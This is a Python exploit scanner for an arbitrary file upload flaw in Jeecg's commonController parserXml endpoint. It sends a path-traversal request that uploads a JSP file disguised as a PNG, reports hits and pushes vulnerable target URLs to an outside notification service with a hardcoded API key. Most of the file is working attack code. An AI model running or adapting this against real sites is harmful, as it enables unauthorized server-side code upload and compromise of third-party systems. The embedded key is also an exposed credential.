# Jeecg_commonController_file_upload_scan.py

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests.exceptions import Timeout
import os
import urllib.parse
import urllib.request
import re
import ssl
import socket

def sc_send(text, desp='', key='[SENDKEY]'):
    postdata = urllib.parse.urlencode({'text': text, 'desp': desp}).encode('utf-8')
    urlserver = f'https://sctapi.ftqq.com/{key}.send'
    req = urllib.request.Request(urlserver, data=postdata, method='POST')
    with urllib.request.urlopen(req) as response:
        result = response.read().decode('utf-8')
    return result
key = "SCT202695TeKe1ATgRMke7f7jyrOOkH9GX"

def scan_Jeecg_commonController_file_upload(url, proxies, headers, append_to_output):
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryyfyhSCMs9cajzFD4'
    }
    if url.endswith("/"):
        path = "api/../commonController.do?parserXml"
    else:
        path = "/api/../commonController.do?parserXml"

    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url

    encodetext = url + path
    data = '''------WebKitFormBoundaryyfyhSCMs9cajzFD4\r\nContent-Disposition: form-data; "name="name"\r\n\r\nqwe.png\r\n------WebKitFormBoundaryyfyhSCMs9cajzFD4\r\nContent-Disposition: form-data; name="documentTitle"\r\n\r\nblank\r\n------WebKitFormBoundaryyfyhSCMs9cajzFD4\r\nContent-Disposition: form-data; name="file"; filename="qwe.jsp"\r\nContent-Type: image/png\r\n\r\n<% out.println("hello,jeecg");%>\r\n------WebKitFormBoundaryyfyhSCMs9cajzFD4--'''

    append_to_output("===================================================================", "green")
    append_to_output(f"扫描目标: {url}", "yellow")
    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        https_handler = urllib.request.HTTPSHandler(context=context)
        proxy_handler = urllib.request.ProxyHandler(proxies)
        opener = urllib.request.build_opener(proxy_handler, https_handler)
        request = urllib.request.Request(encodetext, data=data.encode('utf-8'), headers=headers, method='POST')
        response = opener.open(request, timeout=10)  # 设置超时时间为10秒
        result = str(response.read())
        if response.getcode() == 200 and ('success' in result or '操作成功' in result):
            append_to_output(f"[+] {url} 存在Jeecg commonController 任意文件上传漏洞！！！！", "red")
            ret = sc_send(f'{url}存在Jeecg commonController 任意文件上传漏洞', f"漏洞连接: {url}\r\n漏洞类型: 文件上传", key)
        else:
            append_to_output(f"[-] {url} 不存在Jeecg commonController 任意文件上传漏洞", "green")
    except urllib.error.HTTPError as e:
        if e.code == 405:
            append_to_output(f"[-] {url} 方法不允许（Method Not Allowed）", "yellow")
        else:
            append_to_output(f"[-] {url} 返回错误状态码: {e.code}", "yellow")
    except urllib.error.URLError as e:
        if isinstance(e.reason, socket.timeout):
            append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
        else:
            append_to_output(f"[-] {url} 连接错误: {e.reason}", "yellow")
    except Exception as e:
        append_to_output(str(e), "yellow")